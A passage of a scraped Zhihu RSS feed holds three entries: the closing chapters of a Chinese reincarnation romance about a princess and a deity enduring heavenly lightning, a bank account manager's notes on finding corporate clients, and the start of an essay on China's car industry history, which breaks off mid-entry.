她说，疏桐在昨日晚上已经服药自尽了，她是来接替疏桐的丫鬟。</p>\n<p>她还说，疏桐给我留下了遗书，说对不起我，来世一定做牛做马。</p>\n<p>......有意思吗？</p>\n<p>没有。</p>\n<p>我朝着月亮，流下了一滴泪。</p>\n<p>桂花就要谢了。</p>\n<p>29.</p>\n<p>这场硬仗，前前后后，打了足足六个月。</p>\n<p>听门口的侍卫说，刍荆几次快要抵挡不住，却硬生生扛了下来。</p>\n<p>我在楼岚国，又变成了每天一个人的日子。</p>\n<p>再说得明白点，就是软禁。</p>\n<p>在楼岚国到两个月的时候，我突然吃不下饭。</p>\n<p>而且动不动就吐，行动也很僵硬，浑浑噩噩的，整个人状态非常不好。</p>\n<p>丫鬟们怕我是有什么心疾，连忙请了太医来看。</p>\n<p>那个时候我才知道，我居然怀孕了。</p>\n<p>我......怀孕了？</p>\n<p>是我和瀛玉的孩子。</p>\n<p>我本以为父皇会要我喝药，流掉这个孩子。</p>\n<p>毕竟是刍荆的种，在他眼里，大概会很厌恶吧。</p>\n<p>可出乎我意料的是，父皇他没有。</p>\n<p>他只是让我安心养胎。</p>\n<p>“朕的蓝儿，辛苦了。”</p>\n<p>那只拍在我肩膀上的手，出奇地沉重。</p>\n<p>第七个月刚开始的时候，侍卫同我说，这场战争马上就要结束了。</p>\n<p>我大概猜到了结局，因为那个侍卫同我说完这句话，第二天便上了战场。</p>\n<p>刍荆的士兵虽然人少，但以一当十，一个个身经百战，以命相搏。</p>\n<p>楼岚最后又被打退了。</p>\n<p>刍荆的军队逼到城门口时，我万万没想到，我的亲父皇，将我押了出来。</p>\n<p>我这才知道，他为什么不让我打掉这个跟瀛玉的孩子。</p>\n<p>原来，用场是在这里啊。</p>\n<p>父皇，您就是这样，对待自己的女儿的吗？</p>\n<p>他要让瀛玉看着，看着我，楼岚的九公主，他的太子妃，怀着他的孩子，站在城楼之上。</p>\n<p>我父皇，早在那么久以前就想好了，若是败仗，楼岚的退路该怎么找。</p>\n<p>原来是从我这个孩子身上找。</p>\n<p>好一个帝王之心，好一个亲父皇。</p>\n<p>真正站在这里的时候，我居然一点也不伤心，反而笑了起来。</p>\n<p>挺没意思的，真的。</p>\n<p>我的好父皇啊，您居然会以为瀛玉这样的人，会因为我而放弃攻城？</p>\n<p>瀛玉对我好是真的，但不至于分不清孰轻孰重啊。</p>\n<p>父皇，您真傻。</p>\n<p>瀛玉站在城楼下，与我遥遥相望，相顾无言。</p>\n<p>这么久没见，他瘦了，但还是很好看。</p>\n<p>这半年来，我对他日思夜想，现在终于见上了面，却是要离别。</p>\n<p>铠甲穿在他身上，英气逼人，飒爽得真是能去做个风流倜傥的江湖剑客。</p>\n<p>可是，刍荆国已经死了太多无辜的人。</p>\n<p>这场仗，必须打。</p>\n<p>楼岚，必须灭。</p>\n<p>我们......都要一起死。</p>\n<p>瀛玉搭起了箭，矛头对准我的喉咙，用力将弓拉满。</p>\n<p>他闭了一下眼睛，然后再度看向我。</p>\n<p>眼神是无尽的温柔，还有抱歉。</p>\n<p>不知怎么的，我竟还有心思去想，为什么这场景似曾相识，就像是我已经经历过一般？</p>\n<p>瀛玉看着我，张了张口，但最后什么都没说。</p>\n<p>然后，他的手毫不犹豫地松了开来。</p>\n<p>“嗖！”</p>\n<p>箭已离弦，冲我而来。</p>\n<p>30.</p>\n<p>天界。</p>\n<p>鸿钧本在入定，却突然睁开眼，大喊一声：</p>\n<p>“嫦娥！大事不好！”</p>\n<p>“此事已经被天帝发现了！”</p>\n<p>“什么？那怎么办？”</p>\n<p>鸿钧捋着胡子，满脸忧色：“迦蓝跟瀛玉这一遭，是很难顺利过去了......”</p>\n<p>嫦娥将手放在心口：“还是瞒不住吗......”</p>\n<p>“先看看他们怎么样了。”鸿钧匆匆一展袖袍，轮回白月盘上，白烟散去。</p>\n<p>嫦娥一看，便皱了眉：“还是跟上一世一模一样......”</p>\n<p>“这几乎是定居。毕竟二人在这一场轮回中，谁都没有上一世的记忆，性格没有变化，那最后的结局，本身就很难改变。”</p>\n<p>鸿钧叹了一口气：“天帝......就快来了，我们且去看看罢。”</p>\n<p>“天帝会怎么做？”嫦娥的睫毛上已满是泪花：“天帝是否会放过迦蓝？”</p>\n<p>“务必慎言，只是还好我们现在正在结界之中，不在天帝的可听范围之内。”</p>\n<p>鸿钧捋着胡须：“我与天帝相识已久，总的来说，他是心善之人。”</p>\n<p>“瀛玉为上神时，性情火爆，先前他之前那情劫我以为顶多算是半过不过，现在看来，他根本放不下。”</p>\n<p>“不管怎样，我们做了这一个局，总归还有一线希望。若是之前放瀛玉直接飞升上来抢人，那才是后果不堪设想。”</p>\n<p>31.</p>\n<p>人间。</p>\n<p>眼看着箭在我眼前，即将封喉的时候——</p>\n<p>我刚想闭上眼，突然，时间静止了。</p>\n<p>眼前的一切，都瞬间灰飞烟灭。</p>\n<p>战火，哭喊，鲜血，厮杀，均化为齑粉般的幻影。</p>\n<p>那一瞬间，我的身体里突然出现了一些......本不属于我的记忆。</p>\n<p>我终于知道，为什么我总会做那样的梦。</p>\n<p>为什么眼前的事情，我经常觉得似曾相识。</p>\n<p>因为，这本就是已经发生过的事情。</p>\n<p>我和瀛玉，不过是重来了一回。</p>\n<p>这，是鸿钧仙官给我们制造的机会。</p>\n<p>那一刻，我的记忆全部回来了。</p>\n<p>我本是迦蓝仙灵，最好的朋友，便是广寒宫的嫦娥上仙。</p>\n<p>瀛玉也曾是上神，同我一道下凡历情劫。</p>\n<p>本身我们并不认识，因为我住在九重天，而他住在三十三重天，道行完全不一样。</p>\n<p>可我们都双双折损在了这一关。</p>\n<p>我之前在第一次历劫的时候，以为情况是这样的：</p>\n<p>我们两个都历劫失败，瀛玉被夺神识，而我该受天谴。</p>\n<p>情急之下我的魂灵钻进了一只雪兔的身体，被旧时的好友嫦娥带回宫中，藏了起来，从而逃过了天劫。</p>\n<p>到了广寒宫，嫦娥帮我抹去了记忆，真真正正将我变成了她的玉兔。</p>\n<p>可......事实的真相，我现在才看见。</p>\n<p>其实当年，我若是能为了楼岚国，舍弃瀛玉，那便是情劫过了。</p>\n<p>瀛玉若是能为了刍荆国杀了我，那他的情劫，便也能过了。</p>\n<p>当年，是我没有过那道坎。</p>\n<p>可瀛玉明明过了！</p>\n<p>他为了刍荆的千千万万无辜子民，历年的春秋大业，毅然决然地杀死了我！</p>\n<p>而后城破，刍荆灭了楼岚，一切都结束了。</p>\n<p>他明明就是过了情劫的！</p>\n<p>他可以继续做他的上神！</p>\n<p>却在恢复神识和记忆后，自甘为我顶下天雷！</p>\n<p>我根本没有躲过天雷，天雷当时是落下了的！</p>\n<p>可我不知道，九九八十一道天雷啊，这天谴若是在我身上，受到一半估计就得要了命！</p>\n<p>瀛玉的神识，是直接被那九九八十一道天雷，一点一点打出身体的！</p>\n<p>他的做法触怒了天帝，被天帝剥去最后一分仅存的神格，但又无法死去，只能留在人间修炼！</p>\n<p>他修炼了多少年？我不知道。</p>\n<p>天上一天，地下一年。</p>\n<p>可我记得，我在天上的日子，都已经过了好几百年了。</p>\n<p>天上的几百年......人间的几十万年。</p>\n<p>怪不得，我时常觉得这广寒宫好冷。</p>\n<p>那似乎，并不是我应该常在的地方。</p>\n<p>怪不得，我喜欢去疏月园扑仙蝶。</p>\n<p>因为那里的温度最温暖，像极了刍荆的春暖夏凉。</p>\n<hr>\n<p><b>【应知乎读者要求，弄了个按更新顺序的目录~】</b></p>\n<p><b>【有赞真的会更有动力猛写！真的！求赞～阿郁努力日更！日更！会努力当领头驴！】</b></p>\n<h3>32.</h3>\n<p>我的回忆还未结束，忽然之间，周遭树静风止，广袤的天地之下，只有我和瀛玉二人。</p>\n<p>他与我对视一眼，我们飞快地跑到对方身边，紧紧相拥。</p>\n<p>瀛玉托着我的脸颊，对我说：“对不起。”</p>\n<p>我摇摇头：“我们没得选。”</p>\n<p>这时，天空中劈开一道金光！</p>\n<p>久违了，我们终于见到了天帝。</p>\n<p>万万没想到，天帝亲自来了。</p>\n<p>我上一次见到天帝，也就是第一次飞升，隔着很远望了一眼。</p>\n<p>没想到，第二次见面，就这么近距离。</p>\n<p>只见天帝缓缓开口，他的声音自四面八方传来，刚刚入耳时，我的身体不受控制地抖了一下。</p>\n<p>“上神瀛玉，仙灵迦蓝。”</p>\n<p>听到这话，我和瀛玉不约而同地跪了下来。</p>\n<p>“你们身为天界重要使者，擅自扰乱渡劫规律，一个逃脱惩罚，一个自甘堕落。你们二人，现在可知罪？”</p>\n<p>我和瀛玉同时开口：</p>\n<p>“迦蓝知罪。”</p>\n<p>“瀛玉知罪。”</p>\n<p>“请天帝责罚。”</p>\n<p>话说是这么说，但也就是客套一下，希望天帝能网开一面，求求。</p>\n<p>天帝叹了一口气：“看你们实在感情深重，两次轮回却都难以完满，也属实可惜。”</p>\n<p>“所以，瀛玉，迦蓝。”</p>\n<p>“现在你们有两个选择，一为大隐，二为小隐。”</p>\n<p>我抬起头，向天帝拜了一拜：</p>\n<p>“迦蓝敢问，何为大隐，又何为小隐呢？”</p>\n<p>“你们二人在民间待得久了，应该听闻过野坊有云，大隐隐于世，小隐隐于山林。”</p>\n<p>天帝的声音高高在上，从远方传来，却似乎又近在咫尺：</p>\n<p>“你们二人，本一个为法力高强的三十三重天上神，一个为九重天觉悟最高的仙灵，都是可以长生不死的。”</p>\n<p>“若要选择大隐，那便是入了凡间轮回，再无一丝法力，生生世世都无法再有重回天界的机会。你们会同凡人一样，有生老病死，七情六欲，艰辛坎坷，短暂地过完这一生。”</p>\n<p>“若是选择小隐，则需要主动抹去情劫的记忆，届时会有各自的司命官带你们修行，等到你们再到足以飞升的时机，便可再次重回天界。”</p>\n<p>“到时候，瀛玉，你便可做回你三十三重天最至高荣耀的上神，迦蓝你也可在九重天，与你的旧友为伴，再不分离。”</p>\n<p>“你们选吧。”</p>\n<p>33.</p>\n<p>我与瀛玉对视一眼，各自都读懂了对方的眼神。</p>\n<p>瀛玉朝我点点头，我会意，抬头直视天帝：</p>\n<p>“谢天帝垂怜，迦蓝和瀛玉感激不尽。”</p>\n<p>“我们......我们选择大隐！”</p>\n<p>天帝眉心一蹙，身后发出通天惊雷的巨响。</p>\n<p>——这是天帝震怒了！</p>\n<p>我一惊，想去拉瀛玉的手，后者却周身被镀上一层金箔，我一触碰，便被那层光圈直直地弹了回去！</p>\n<p>这道金箔不会伤害我，却不让我碰到瀛玉，也不让瀛玉得以动弹！</p>\n<p>天帝已经不知去了哪里，而雷声渐渐向我们袭来。</p>\n<p>瀛玉被金箔锁住动弹不得，他的口型，是让我快跑。</p>\n<p>原来如此，若是我们选了大隐，天帝便不会放过我们。</p>\n<p>罢了，罢了。</p>\n<p>死在一起，也是好事。</p>\n<p>无论是阴阳两隔，还是双生却不能相见，都是最痛苦的。</p>\n<p>死在一起，反而无憾。</p>\n<p>这天劫之雷，是数年前曾该落在我身上的劫。</p>\n<p>那时，瀛玉替我受下了。</p>\n<p>那么这一次，这道雷再劈下来，说什么我也要给他扛着。</p>\n<p>只要我还有一口气，这雷，就别想伤害我的瀛玉一寸一毫！</p>\n<p>天劫来得比我想象的，要快一万倍。</p>\n<p>电光火石之间，一道雷从高空处直直地劈下，直接对准了被禁锢住行动的瀛玉！</p>\n<p>这是第一道雷。</p>\n<p>34.</p>\n<p>我毫不犹豫地冲了上去，挡在瀛玉身前。</p>\n<p>雷打在我身上，只一秒便皮开肉绽。</p>\n<p>我之前做足了准备，以为自己会疼得尖叫。</p>\n<p>可真正体会到之后，原来，根本喊不出来。</p>\n<p>只是一下，便已疼得要昏过去。</p>\n<p>周遭是浓厚的血腥味，那一记天雷劈在我的腰部，钻心的疼。</p>\n<p>我站不起来了。</p>\n<p>可第二道雷紧跟着劈下。</p>\n<p>我退无可退，只能强行扭着身体，往瀛玉前面靠。、</p>\n<p>第二道雷落下，我终于疼得喊了出来。</p>\n<p>“啊啊啊啊啊啊啊啊啊啊啊啊啊！”</p>\n<p>第三道，第四道，第五道，第六道......</p>\n<p>肩膀，胯部，小腿，手臂......</p>\n<p>一道一道，速度越来越快。</p>\n<p>我咳出来的血，将瀛玉身下的金箔都染成了红色。</p>\n<p>我不敢去看自己的身体，此刻大抵已经是体无完肤。</p>\n<p>瀛玉......原来它这么疼。</p>\n<p>最后站不得，哭不得，晕过去，再被打醒。</p>\n<p>死去活来，求死不得，求生不能。</p>\n<p>哭都没有力气了，不知道这是第几道。</p>\n<p>我当然也不敢抬头去看瀛玉的脸。</p>\n<p>不然，我的心一定会痛得要裂开。</p>\n<p>35.</p>\n<p>最后一道雷来时，我拖着沉重的身躯，一点一点地爬到瀛玉的面前。</p>\n<p>他的身体不能动，眼睛却已经是血红色。</p>\n<p>求你......不要。</p>\n<p>谁？</p>\n<p>是瀛玉在说话吗？</p>\n<p>我......是不是已经幻听了？</p>\n<p>抬起头，只看见瀛玉眼角滚下一滴泪来。</p>\n<p>在这种情况下，我竟然笑了出来。</p>\n<p>最后一点神识，用来跟我说了这么一句话。</p>\n<p>“瀛玉。”我笑着，口中喷出一股鲜血。</p>\n<p>那血真红，真多啊，呛的我满口都是，鼻腔里也溢满了粘稠的液体。</p>\n<p>真抱歉，死的时候给你留下的印象，是这么丑的。</p>\n<p>“我......我爱你。”</p>\n<p>说完这句话，我用最后的气力，再次挡在瀛玉身前。</p>\n<p>我只是一个小仙灵，按我的资历和魂魄，本不该受得了这八十一道天雷，早应魂飞魄散了。</p>\n<p>或许是执念所致，我竟撑到了现在。</p>\n<p>这样的爱，无所不能。</p>\n<p>我亦感谢这样的奇迹，让我的瀛玉，至少能活在这世间，哪怕是只有一世也好。</p>\n<p>嫦娥跟我关系那么好，一定会帮忙消除他所有的记忆的，毕竟他之后只是个凡人。</p>\n<p>天界太冷了，咱们就想来人间看看，这里多好啊......</p>\n<p>你看啊瀛玉，桂花，又要开了......</p>\n<p>36.</p>\n<p>“砰！”</p>\n<p>天雷将地面砸出一个巨大的坑洞。</p>\n<p>过了许久，我才睁开眼。</p>\n<p>这道天雷......没劈到我身上？</p>\n<p>我......没死？</p>\n<p>不过......</p>\n<p>大概也快了吧。</p>\n<p>下一秒，瀛玉周身的金箔瞬间碎裂，他几乎是立刻就扑到了我的身上。</p>\n<p>瀛玉的眼尾红得比血色还要浓烈，他颤抖地托着我残破不堪的身体，手都不知道往哪儿放。</p>\n<p>他的声音颤抖着：</p>\n<p>“迦蓝，迦蓝，你看看我，你不要睡。”</p>\n<p>“迦蓝！迦蓝你不要闹！别吓我！”</p>\n<p>“听着，阿蓝，别害怕，不要怕，信我，能治好，咱们能治好的......”</p>\n<p>“楼迦蓝，你看看我......你傻不傻......”</p>\n<p>我试着想抬起手，抚去他眼角边快要掉下的一滴泪。</p>\n<p>可是，我的手怎么也使不上力气。</p>\n<p>瀛玉的怀抱，好温暖啊。</p>\n<p>他是炽热的，鲜活的。</p>\n<p>这么多年在天上，真的太冷了。</p>\n<p>有这么一刻，留在他怀里......</p>\n<p>也值了。</p>\n<p>37.</p>\n<p>不知是什么时候，天帝又出现在我们眼前。</p>\n<p>这一次，他的眼神，似乎有些与刚才不同的意味。</p>\n<p>突然间他大手一挥，天降甘霖，落在我和瀛玉的身上。</p>\n<p>不知不觉间，我的身上似乎，没那么疼了。</p>\n<p>从瀛玉的表情来看，我似乎正在恢复。</p>\n<p>没过多久，我发现自己渐渐有了力气。</p>\n<p>“瀛......瀛玉......”</p>\n<p>瀛玉的头发被雨水打湿，贴在脸颊上，有一种破碎的美感。</p>\n<p>“嗯，阿蓝，我在。”瀛玉抱紧了我：“阿蓝，你......你还好吗？”</p>\n<p>我点点头，发现自己浑身竟已经完好无损。</p>\n<p>瀛玉与我，一同看向上空的天帝。</p>\n<p>天帝摇摇头：“罢了。这一次......就放你们走吧。”</p>\n<p>“方才，嫦娥跟老鸿钧来找我了，还跟我打了一个赌。”</p>\n<p>“他们跟我打赌说，若是迦蓝愿意如千年以前，瀛玉保护她那般，以命挡住天雷，那我便网开一面，放你们大隐。”</p>\n<p>“我答应了，而你们做到了......我也该履行承诺。”</p>\n<p>“迦蓝，你该庆幸，你有如此替你着想的两位至交好友。”</p>\n<p>“你们若是选择大隐，之前的记忆会全部消失，再也没有入天界的可能性了。”</p>\n<p>我朝天帝磕了一个头：“迦蓝此生无以为报鸿钧仙官与嫦娥上仙了，还烦请天帝替我跟瀛玉，向他们二人道一声谢。”</p>\n<p>天帝看了我们一眼，转身离去了。</p>\n<p>而我跟瀛玉的手上，不知道什么时候，居然多了一根红绳。</p>\n<p>我的耳边，居然传来了嫦娥的声音。</p>\n<p>听到她声音的那一刻，我便忍不住地掉了眼泪。</p>\n<p>“迦蓝，这是我去问月老要的红线，一定要带着啊，这样你们生生世世，就都能在一起啦。”</p>\n<p>“来不及跟你当面告别了，再见啦，我会想你的。”</p>\n<p>刹那间，新芽抽绿，万物生长，天色分明，溪流淙淙。</p>\n<p>我们的眼前，瞬时出现一个巨大的光圈。</p>\n<p>瀛玉不由分说，偏头吻住我的唇。</p>\n<p>我闭上眼睛，享受这一刻的温存。</p>\n<p>眼前的光斑，在一帧一帧地闪烁。</p>\n<p>我知道，这是在催促我们了。</p>\n<p>瀛玉牵起我的手，一同走到光圈跟前。</p>\n<p>我看向他，他也看向我。</p>\n<p>“那就......待会儿见？”</p>\n<p>瀛玉笑了。</p>\n<p>“嗯，一会见，阿蓝。”</p>\n<p>然后，我们义无反顾地，一同跨了进去。</p>\n<h3><b>【尾声】</b></h3>\n<p>很多很多年以后。</p>\n<p>“呜哇！”</p>\n<p>婴孩的啼哭声，代替了今早的公鸡打鸣，将整个仙月国唤醒。</p>\n<p>仙月国的太子，和丞相府大夫人的女儿，在同一天出生了。</p>\n<p>那天晚霞成彩云追月之势，仙月国的国师说，此乃福相双至。</p>\n<p>当然不仅是国师这么说，民间的街坊邻居，大街小巷的百姓，也都看见了这一奇观，皆连赞叹仙月国定是有大喜之事。</p>\n<p>皇帝闻之大喜，大手一挥，大赦天下。</p>\n<p>并且将这丞相府的女儿钦定为未来的太子妃，并赐上好的白玉红绳一对。</p>\n<p>一根，即刻绕在太子手上。</p>\n<p>一根，则系在这丞相府大小姐的手腕。</p>\n<p>小太子跟大小姐，从牙牙学语到总角之年，一路这么对打对骂过来，谁也看不上谁。</p>\n<p>但真说要退婚吧......二人倒是一块儿脸红了，说那倒也不必。</p>\n<p>真倒是当局者迷，旁观者清。</p>\n<p>你们二人有没有那劳什子情爱，咱们作为明眼人，可看得那叫一个再清楚不过了！</p>\n<p>再后来，仙月国的太子成了皇帝，太子妃成了皇后。</p>\n<p>民间的说书人，也都爱说他们这对少年夫妻的故事。</p>\n<p>你如果要问，说书人是怎么说的呢？</p>\n<p>那就得从很多年前说起了。</p>\n<p>告诉您，这皇上跟皇后啊，那可是天赐的姻缘呢！</p>\n<p>就像是......就像是从一开始就注定好的！</p>\n<p>不信？</p>\n<p>这可是真的！我可知道许多内情！</p>\n<p>想听？</p>\n<p>那您就搬个板凳，只要两个铜钱，便能听一出真正的好戏！</p>\n<p>客官快过来，瓜子茶水已经备好。</p>\n<p>听我在这里给您呀，慢慢儿说......</p>\n<p><b>【END】</b></p>\n<p><b>【呼~又一篇阿郁的古言完结啦，还是照旧日更~更了六天，终于结束啦！】</b></p>\n<p><b>【感谢大家的支持，走过路过点个赞和关注呀！谢谢！鞠躬。jpg】</b></p>\n<p><b>【我们下一篇写橙子和梁主席的故事！】</b></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/xu-nian-nian-angla?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">庄停郁</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/484001869/answer/2098143630?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">208 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/360227471?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">嫦娥和玉兔会有什么日常呢？</a><br><a href=\"http://www.zhihu.com/question/35974811?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">后羿能射下9个太阳，为什么老婆背叛他跑到月亮上了，嫦娥不怕被射下来么？后羿为什么不射呢？</a><br>\n","link":"http://www.zhihu.com/question/484001869/answer/2098143630?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"银行对公客户经理工作内容--1","date":"2021-09-11 14:43:56","description":"\n<p>Hi，今天下班比较早，跟大家继续聊聊银行的工作，下一期会讲薪酬方面~这一主题准备分工作内容&amp;应酬来讲。首先声明，这都是基于我个人工作经验总结的，不同地区不同行肯定有差异，欢迎大家评论多多交流呀~也给想进银行的朋友们提供个参考~</p>\n<p>1、核心工作</p>\n<p>对公客户经理核心工作就是营销并维护客户、为客户提供以融资为主的金融服务，客户支付贷款利息\\服务费\\中间业务费用等等，存贷款和营收考核是重点。</p>\n<p>（一）营销客户：根据本行授信政策，筛选出符合条件的企业，去营销，非常的难！有资源的员工动用自己的关系，把别人搞不定的客户抢过来，资源也是一种能力！！一般这种资源型人才大多来自或者家里人来自同业\\大型国企\\政府部门\\相关监管部门。</p>\n<p>重点说一下没有资源的小伙伴该如何寻找客户️</p>\n<p>✅行长介绍：支行行长的资源一般是最多的，在众多客户经理里，行长会把他的资源给谁呢？行长想要的是听话、靠谱、办事利索的人，你不需要多么会说话会来事儿（如果会来事儿非常加分），但是交代的事必须办好，必须踏实能干，其他的事情行长自然会维护，收益都帮你谈好。</p>\n<p>✅熟人介绍：找自己熟悉的朋友同学同业给你介绍客户，起码你能拿到客户电话，能摸到门。</p>\n<p>✅老客户转介：让已经是自己的客户给介绍它们行业相关客户，这个成功率还是很高的。</p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/dan-mei-13-12?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Evelyn.Z</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/408381632?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"跨界融合 汽车业的涅槃（上）","date":"2021-09-10 09:39:56","description":"\n<p>什么是界？新华字典的解释是：两个地区分界的线；什么是行业的界？一位专家的解释是：专业或资本、技术、自然垄断形成的门槛；什么是汽车行业的界？一位车企老领导称：以内燃机为主要动力的传统汽车产业形成的产业链。在中国，还有一条制度划出的界：行业的管理体制、监管体制、准入和退出等机制形成的界。</p>\n<p>如今，随着一批批“造车新力量”的大举侵入，中国传统汽车行业正在经历一场前所未有的熬炼，是蜕一层皮还是凤凰涅槃，已经不是这个行业自身能决定的事情。对这一巨变，外界给了一个温柔美丽的词：跨界融合。殊不知，这种跨界之后的融合，会革了传统汽车行业的命。</p>\n<p>为什么这么说？</p>\n<h2><b>跨界融合 撼动了传统汽车业的根基</b></h2>\n<p>1885年，德国人卡尔·奔驰造出世界上第一辆以汽油为动力的三轮汽车,并于次年申请了发明专利。这一天是世界汽车诞生日。</p>\n<p>1894年，法国人路易斯·潘哈德和埃米尔·拉瓦索尔合作，发明了手动变速器。从那一年起，汽车才能够进退自如、快慢如意地行驶了。</p>\n<p>1913年，美国人亨利·福特发明了汽车制造流水线，使生产效率大幅提高，制造成本大幅下降。从那一年起，汽车成了人民大众买得起的车。</p>\n<p>136年来，发动机、变速器、生产流水线，一直是汽车最核心的技术和生产方式，虽经无数次迭代升级，却始终是外部势力难以逾越的深沟高垒。如果不是1971年的石油危机，丰田乘机以小型化、轻量化、节能的优势挤进来，世界汽车市场仍将是奔驰、宝马、通用、福特、雪铁龙们的天下；如果不是1986年的改革开放，北京吉普、上汽大众、广汽丰田、重庆长安、保定长城、浙江吉利们应运而生，中国汽车市场仍将是一汽解放、二汽东风、北京越野、上海轿车的天下。如果还是以石油为动力源，特斯拉、蔚来们绝不可能成功立足汽车业，世界与中国汽车格局的楚河汉界仍然是一如既往地固若金汤。</p>\n<p>能源革命革了发动机、变速器的命，突破了岿然不动的汽车行业技术壁垒，动摇了传统汽车赖以生存的根基。碳减排、碳达峰的进一步加持，加速了汽车行业跨界融合的进程。</p>\n<h2><b>轿车进家庭 掀起中国跨界造车第一浪</b></h2>\n<p>许多人都认为跨界造车始于今天，但上世纪八十年代我国汽车业的边界就被突破了，而且是两股力量分别从纵向和侧向的突破。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h2><b>第一股力量 外企带来合资潮</b></h2>\n<p>改革开放之前，汽车作为生产资料实行国家计划调拨制度，没有现代意义上的汽车工业，没有汽车市场，也没有私人汽车。从1949年建国到1978年的49年间，全国累计生产汽车140.16万辆，其中轿车1.49万辆。汽车工业的状况是缺重、少轻，轿车基本空白，没钱、没技术，仅有的几款车型还是20年一贯制。</p>\n<p>1982年，改革开放的总设计师邓小平批示“轿车可以合资”。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-8a50f41ae3f72b1c911b60b48ee348f1_b.jpg\" data-size=\"normal\" data-rawwidth=\"831\" data-rawheight=\"534\" class=\"origin_image zh-lightbox-thumb\" width=\"831\" data-original=\"https://pic2.zhimg.com/v2-8a50f41ae3f72b1c911b60b48ee348f1_r.jpg\"><figcaption>北京吉普汽车公司</figcaption></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p>1984年1月，北京吉普汽车公司开业。1984年10月10日，上汽大众合资签字仪式在人民大会堂举行。1985年广州标致汽车成立。这是我国最早成立的三家中外合资汽车企业。后来又有了一汽大众、神龙富康、上汽通用、广州本田等一批合资企业。</p>\n<p>合资的初衷是利用外资引进技术发展自主。那时，中国汽车工业太需要发达国家成熟的技术和资金的支持。</p>\n<p>中国汽车工业太落后了。</p>\n<p>合资前，北京吉普母公司北京汽车制造厂年产北京BJ212越野车15000辆。上汽大众母公司上海汽车厂最高年产上海牌轿车5000辆。</p>\n<p>合资前，美国专家来北汽考察，北汽拿出了BJ 212。美国专家拆检后说，这款车的发动机、变速箱和大部分总成来自1937年的福特汽车。原来，苏联曾从福特引进技术，1956年推出伏尔加牌轿车。1959年北汽获得伏尔加图纸，1964年推出了BJ 212。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-c63db93d6fc86f2f4a7429ce0b9730ea_b.jpg\" data-size=\"normal\" data-rawwidth=\"831\" data-rawheight=\"554\" class=\"origin_image zh-lightbox-thumb\" width=\"831\" data-original=\"https://pic3.zhimg.com/v2-c63db93d6fc86f2f4a7429ce0b9730ea_r.jpg\"><figcaption>北汽BJ212（网络图片）</figcaption></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p>合资前，上海汽车厂为尽快掌握桑塔纳轿车的装配制造工艺，在原上海牌轿车拼装车间里圈出一块空地组装桑塔纳。当习惯用榔头敲轿车的工人从包装木箱中取出桑塔纳“白车身”（车身外壳）时都惊呆了，怎么德国车不用“敲”，“拼”起来就行？</p>\n<p>这是两位亲历者的回忆。</p>\n<p>外企带着世界先进的汽车技术、工艺、生产方式、管理方式进入中国，中国汽车工业落后的面貌迅速改观。2010年，中国以1380万辆的销量，超过美国成为世界最大的汽车市场。</p>\n<p>这是成熟的汽车社会对尚未开发的汽车社会的跨界，这是先进的汽车生产方式对落后的汽车生产方式的改造，这是先进的汽车发展理念对落后的汽车发展理念的融合。</p>\n<p>但，这种跨界是单向的，这种改造是降维式的，被融合的主体是中方。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h2><b>第二股力量 民企带来“鲶鱼效应”</b></h2>\n<p>李书福是汽车圈儿都熟悉的人。</p>\n<p>上世纪90年代末那几年，李书福利用一切机会游说他能见到的国家部委官员，甚至游说到了国家计委主任曾培炎面前。他说得最多的两句话是：“轿车是什么？就是四个轮子+几个沙发+一个壳子！”，“我花自己的钱圆中国人的轿车梦，失败的结果由我自己承担，就请给我一次失败的机会吧。”</p>\n<p>那时，李书福30多岁，但已是小有名气的农民企业家。他开过照相馆、造过电冰箱、办过铝塑板厂、产过摩托车，而且干什么成什么。1996年，吉利摩托车产销达到20万辆，畅销30多个国家和地区。但他一门心思想的是轿车，可那时国家对汽车实行严格的准入制度，，只允许“三大（一汽、东风、上汽）三小（北京吉普、天津夏利、广州标致）”生产轿车。</p>\n<p>他是个局外人。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-456de5a71dd3133fc2aacd88c2b7799b_b.jpg\" data-size=\"normal\" data-rawwidth=\"831\" data-rawheight=\"437\" class=\"origin_image zh-lightbox-thumb\" width=\"831\" data-original=\"https://pic4.zhimg.com/v2-456de5a71dd3133fc2aacd88c2b7799b_r.jpg\"><figcaption>吉利集团总部原址</figcaption></figure><p 